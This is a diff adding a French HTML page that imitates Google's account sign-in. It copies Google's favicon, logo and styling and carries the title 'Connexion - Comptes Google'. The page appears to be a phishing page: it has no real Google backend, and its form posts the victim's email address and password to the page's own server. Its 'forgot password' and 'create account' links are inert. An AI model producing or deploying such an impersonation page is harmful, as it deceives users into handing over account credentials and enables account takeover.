@@ -1,0 +1,37 @@
+<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+	<title>Connexion - Comptes Google</title>
+	<link href="https://www.gstatic.com/images/branding/product/ico/googleg_al_32dp.ico" rel="shortcut icon"/>
+	<style type="text/css">body { background-color: #f0f4f9; font-family: 'Google Sans', Roboto, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background-color: #ffffff; padding: 48px; border-radius: 28px; width: 100%; max-width: 1040px; display: flex; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .left-col { width: 50%; padding-right: 40px; display: flex; flex-direction: column; justify-content: flex-start; }
+        .right-col { width: 50%; }
+        .logo { height: 48px; width: 48px; margin-bottom: 24px; margin-left: -4px; display: block; }
+        h2 { font-size: 36px; font-weight: 400; color: #1f1f1f; margin: 0 0 16px 0; }
+        p { font-size: 16px; color: #1f1f1f; margin-bottom: 32px; }
+        .input-field { width: 100%; height: 56px; border: 1px solid #747775; border-radius: 4px; padding: 13px 15px; font-size: 16px; margin-bottom: 15px; box-sizing: border-box; }
+        .input-field:focus { border: 2px solid #0b57d0; outline: none; }
+        .link { color: #0b57d0; font-size: 14px; font-weight: 500; text-decoration: none; display: inline-block; cursor: pointer; }
+        .footer-action { margin-top: 50px; display: flex; justify-content: space-between; align-items: center; }
+        .btn-submit { background-color: #0b57d0; color: white; border: none; padding: 10px 24px; border-radius: 20px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        .btn-submit:hover { background-color: #0842a0; }
+	</style>
+</head>
+<body>
+<div class="container">
+<div class="left-col"><svg class="logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"> <path d="M44.5 20H24v8.5h11.8C34.7 33.9 30.1 37 24 37c-7.2 0-13-5.8-13-13s5.8-13 13-13c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4C34.6 4.1 29.6 2 24 2 11.8 2 2 11.8 2 24s9.8 22 22 22c11 0 21-8 21-22 0-1.3-.2-2.7-.5-4z" fill="#4285F4"></path> <path d="M4.3 14.6l7.1 5.3C13.1 14.5 18 10.5 24 10.5c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4C34.6 4.1 29.6 2 24 2 15.8 2 8.7 7.1 4.3 14.6z" fill="#EA4335"></path> <path d="M24 46c5.9 0 11.1-2.4 14.9-6.3l-7-5.8c-2.2 1.4-5 2.2-7.9 2.2-6.1 0-11-4.1-12.7-9.6l-7.2 5.5C8.7 40.9 15.8 46 24 46z" fill="#34A853"></path> <path d="M11.3 26.5c-.3-1-.5-2-.5-3s.2-2 .5-3L4.2 15c-1.1 2.7-1.7 5.7-1.7 9s.6 6.3 1.7 9l7.1-5.5z" fill="#FBBC05"></path> </svg>
+<h2>Connexion</h2>
+
+<p>Accéder à vos services professionnels</p>
+</div>
+
+<div class="right-col">
+<form action="" method="POST">
+<div class="input-group"><input class="input-field" name="username" placeholder="Adresse e-mail" required="" type="email"/> <input class="input-field" name="password" placeholder="Saisissez votre mot de passe" required="" type="password"/> <span class="link">Mot de passe oublié ?</span></div>
+
+<div class="footer-action"><span class="link">Créer un compte</span><button class="btn-submit" type="submit">Suivant</button></div>
+</form>
+</div>
+</div>
+
+
+</body></html>
